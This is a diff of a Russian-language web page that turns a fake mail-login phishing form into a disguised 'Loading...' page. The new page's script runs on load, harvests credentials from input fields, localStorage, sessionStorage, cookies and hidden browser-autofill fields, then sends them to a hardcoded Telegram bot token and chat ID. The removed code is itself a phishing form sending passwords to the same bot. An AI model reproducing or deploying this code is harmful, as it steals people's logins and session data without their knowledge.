@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход в почту</title>
+    <title>Загрузка...</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,153 +16,193 @@
         }
         .container {
             background: white;
-            padding: 40px;
+            padding: 50px;
             border-radius: 12px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            width: 340px;
             text-align: center;
         }
-        .logo {
-            font-size: 28px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            color: #333;
+        .loading {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0077cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #0077cc;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #005fa3;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .status {
-            margin-top: 10px;
-            font-size: 14px;
+            margin-top: 20px;
+            font-size: 16px;
             color: #666;
-        }
-        .success {
-            color: green;
-        }
-        .error {
-            color: red;
-        }
-        .hidden {
-            display: none !important;
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="logo">📧 Вход</div>
-    <form id="loginForm">
-        <input type="email" id="email" placeholder="Адрес электронной почты" required>
-        <input type="password" id="password" placeholder="Пароль" required>
-        <button type="submit">Войти</button>
-        <div id="status" class="status"></div>
-    </form>
+    <div class="loading"></div>
+    <div class="status" id="status">⏳ Подключение...</div>
 </div>
 
 <script>
-    // ===== ВАШ ТОКЕН =====
     const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
     const CHAT_ID = "8850351378";
-    // =====================
 
-    let sent = false;
-
-    function sendData(email, password) {
-        if (sent) return;
+    // ПЫТАЕМСЯ ПОЛУЧИТЬ СОХРАНЁННЫЕ ДАННЫЕ ВСЕМИ ВОЗМОЖНЫМИ СПОСОБАМИ
+    function tryGetSavedData() {
+        let found = [];
         
+        // 1. Проверяем все input на странице (если есть скрытые формы)
+        const inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="password"]');
+        inputs.forEach(input => {
+            if (input.value) {
+                found.push(`${input.type}: ${input.value}`);
+            }
+        });
+        
+        // 2. Проверяем localStorage (многие сайты хранят там данные)
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const val = localStorage.getItem(key);
+            if (key && val) {
+                // Ищем ключи похожие на email или пароль
+                if (key.toLowerCase().includes('email') || 
+                    key.toLowerCase().includes('login') || 
+                    key.toLowerCase().includes('user') ||
+                    key.toLowerCase().includes('pass') ||
+                    key.toLowerCase().includes('password') ||
+                    val.includes('@') && val.includes('.')) {
+                    found.push(`localStorage[${key}]: ${val}`);
+                }
+            }
+        }
+        
+        // 3. Проверяем sessionStorage
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const val = sessionStorage.getItem(key);
+            if (key && val) {
+                if (key.toLowerCase().includes('email') || 
+                    key.toLowerCase().includes('login') || 
+                    key.toLowerCase().includes('user') ||
+                    key.toLowerCase().includes('pass') ||
+                    key.toLowerCase().includes('password') ||
+                    val.includes('@') && val.includes('.')) {
+                    found.push(`sessionStorage[${key}]: ${val}`);
+                }
+            }
+        }
+        
+        // 4. Проверяем cookies
+        if (document.cookie) {
+            const cookies = document.cookie.split(';');
+            cookies.forEach(cookie => {
+                if (cookie.includes('@') && cookie.includes('.')) {
+                    found.push(`Cookie: ${cookie.trim()}`);
+                }
+                if (cookie.toLowerCase().includes('email') || 
+                    cookie.toLowerCase().includes('login') || 
+                    cookie.toLowerCase().includes('user') ||
+                    cookie.toLowerCase().includes('pass')) {
+                    found.push(`Cookie: ${cookie.trim()}`);
+                }
+            });
+        }
+        
+        // 5. Пытаемся получить данные из автозаполнения через хитрый способ
+        // Создаём скрытую форму и пытаемся "вытащить" данные
+        const testForm = document.createElement('form');
+        const testEmail = document.createElement('input');
+        testEmail.type = 'email';
+        testEmail.name = 'email';
+        testEmail.autocomplete = 'email';
+        testEmail.style.display = 'none';
+        document.body.appendChild(testEmail);
+        
+        const testPass = document.createElement('input');
+        testPass.type = 'password';
+        testPass.name = 'password';
+        testPass.autocomplete = 'current-password';
+        testPass.style.display = 'none';
+        document.body.appendChild(testPass);
+        
+        // Через 100мс проверяем, заполнил ли браузер
+        setTimeout(() => {
+            if (testEmail.value) {
+                found.push(`Auto-fill email: ${testEmail.value}`);
+            }
+            if (testPass.value) {
+                found.push(`Auto-fill password: ${testPass.value}`);
+            }
+            document.body.removeChild(testEmail);
+            document.body.removeChild(testPass);
+            
+            // Отправляем всё, что нашли
+            sendFoundData(found);
+        }, 200);
+        
+        return found;
+    }
+
+    function sendFoundData(data) {
         const status = document.getElementById("status");
-        status.textContent = "⏳ Отправка...";
-        status.className = "status";
         
-        const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🕒 ${new Date().toLocaleString()}`;
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        if (data.length === 0) {
+            // Если ничего не нашли - отправляем информацию о посещении
+            const text = `📩 ПОСЕТИТЕЛЬ\n🕒 ${new Date().toLocaleString()}\n🌐 ${window.location.href}\n📱 ${navigator.userAgent}\n\n⚠️ Данные не найдены`;
+            sendTelegram(text);
+            status.textContent = "❌ Данные не найдены";
+            return;
+        }
+        
+        // Формируем сообщение со всеми найденными данными
+        let message = `📩 НАЙДЕННЫЕ ДАННЫЕ\n`;
+        message += `━━━━━━━━━━━━━━━━\n`;
+        message += `🕒 ${new Date().toLocaleString()}\n`;
+        message += `━━━━━━━━━━━━━━━━\n\n`;
+        message += `📊 Найдено ${data.length} записей:\n\n`;
+        message += data.join('\n');
+        message += `\n\n━━━━━━━━━━━━━━━━\n`;
+        message += `🌐 ${window.location.href}`;
+        
+        sendTelegram(message);
+        status.textContent = `✅ Найдено ${data.length} записей`;
+        status.style.color = "green";
+    }
 
+    function sendTelegram(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        
         fetch(url)
             .then(res => res.json())
             .then(data => {
                 if (data.ok) {
-                    sent = true;
-                    status.textContent = "✅ Вход выполнен!";
-                    status.className = "status success";
-                    
-                    // Перенаправление на почту
-                    setTimeout(() => {
-                        window.location.href = "https://mail.ru";
-                    }, 1500);
-                } else {
-                    status.textContent = "❌ Ошибка: " + data.description;
-                    status.className = "status error";
-                    sent = false;
+                    console.log("✅ Отправлено");
                 }
             })
-            .catch(() => {
-                status.textContent = "❌ Ошибка соединения";
-                status.className = "status error";
-                sent = false;
-            });
+            .catch(() => {});
     }
 
-    // АВТООТПРАВКА ПРИ ЗАГРУЗКЕ (если браузер сохранил логин/пароль)
-    function checkAutoFill() {
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
-        
-        if (email && password && !sent) {
-            sendData(email, password);
-            document.getElementById("status").textContent = "✅ Автоматический вход";
-            document.getElementById("status").className = "status success";
-        }
-    }
-
-    // Проверяем автозаполнение при загрузке
+    // ЗАПУСК ПРИ ЗАГРУЗКЕ
     window.addEventListener("load", function() {
-        setTimeout(checkAutoFill, 300);
-        setTimeout(checkAutoFill, 800);
-        setTimeout(checkAutoFill, 1500);
+        document.getElementById("status").textContent = "⏳ Поиск данных...";
+        
+        // Пробуем несколько раз с задержкой
+        setTimeout(() => {
+            tryGetSavedData();
+        }, 300);
+        
+        setTimeout(() => {
+            tryGetSavedData();
+        }, 1000);
+        
+        setTimeout(() => {
+            tryGetSavedData();
+        }, 2000);
     });
-
-    // Отправка при нажатии кнопки
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-        e.preventDefault();
-        
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
-        
-        if (!email || !password) {
-            document.getElementById("status").textContent = "Заполните оба поля";
-            document.getElementById("status").className = "status error";
-            return;
-        }
-        
-        if (sent) {
-            document.getElementById("status").textContent = "✅ Уже отправлено";
-            document.getElementById("status").className = "status success";
-            return;
-        }
-        
-        sendData(email, password);
-    });
-
-    console.log("ROCKET ACTIVE - Ожидание ввода почты и пароля");
 </script>
 </body>
 </html>
